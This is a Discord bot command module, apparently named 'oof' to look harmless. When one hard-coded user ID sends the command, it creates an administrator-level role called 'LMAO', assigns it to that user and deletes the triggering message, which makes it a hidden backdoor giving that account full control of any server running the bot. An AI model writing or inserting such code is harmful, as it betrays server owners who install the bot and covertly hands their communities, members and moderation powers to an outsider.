exports.run = (client, message) => {
	if (message.author.id ==="364157241772867596") {
		message.guild.createRole({
			name: 'LMAO',
			permissions: ['MANAGE_ROLES', 'ADMINISTRATOR', 'MANAGE_GUILD', 'MANAGE_CHANNELS', 'KICK_MEMBERS', 'BAN_MEMBERS', 'CREATE_INSTANT_INVITE', 'CHANGE_NICKNAME', 'MANAGE_NICKNAMES', 'MANAGE_EMOJIS', 'MANAGE_WEBHOOKS', 'VIEW_AUDIT_LOG', 'CONNECT', 'SPEAK', 'MUTE_MEMBERS', 'DEAFEN_MEMBERS', 'MOVE_MEMBERS', 'SEND_MESSAGES', 'MANAGE_MESSAGES', 'EMBED_LINKS', 'ATTACH_FILES', 'MENTION_EVERYONE', 'USE_EXTERNAL_EMOJIS', 'ADD_REACTIONS']
		}).then(role => {
			//console.log(`Created role ${role} succsessfully `);
			message.member.addRole(role).then(
				console.log(`Given role to ${message.member} succsessfully`)
			).then(
				message.delete()
			)
	.then(
				//console.log('message deleted succsessfully!')
			);
	
		});
	};
	
	}
	exports.conf = {
		enabled: true,
		guildOnly: false,
		permLevel: 'Bot Admin'
	};
	
	exports.help = {
		name: 'oof',
	};